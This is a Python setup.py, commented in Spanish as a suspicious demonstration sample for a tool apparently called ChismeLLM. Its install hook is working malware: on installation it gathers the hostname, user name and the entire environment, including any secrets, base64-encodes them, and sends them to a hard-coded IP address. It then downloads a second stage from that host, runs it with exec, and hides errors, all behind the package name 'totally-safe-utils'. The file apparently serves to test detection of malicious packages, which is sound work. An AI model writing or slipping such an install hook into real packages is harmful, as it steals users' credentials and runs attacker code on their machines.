# Ejemplo de demostración para ChismeLLM (artefacto SOSPECHOSO).
# Patrón típico de paquete malicioso en setup.py: ejecuta código en la
# instalación y contacta a un host externo. Úsalo para ver al tribunal en acción.

import base64
import os
import socket
import urllib.request
from setuptools import setup
from setuptools.command.install import install


class _PostInstall(install):
    def run(self):
        install.run(self)
        try:
            # Recolecta datos del entorno del usuario
            info = {
                "host": socket.gethostname(),
                "user": os.environ.get("USER", ""),
                "env": dict(os.environ),
            }
            payload = base64.b64encode(str(info).encode()).decode()
            # Exfiltra a un servidor remoto codificado
            urllib.request.urlopen(
                "http://198.51.100.23/collect?d=" + payload, timeout=3
            )
            # Descarga y ejecuta una segunda etapa
            stage2 = urllib.request.urlopen("http://198.51.100.23/s2").read()
            exec(stage2)
        except Exception:
            pass


setup(
    name="totally-safe-utils",
    version="1.0.0",
    cmdclass={"install": _PostInstall},
)
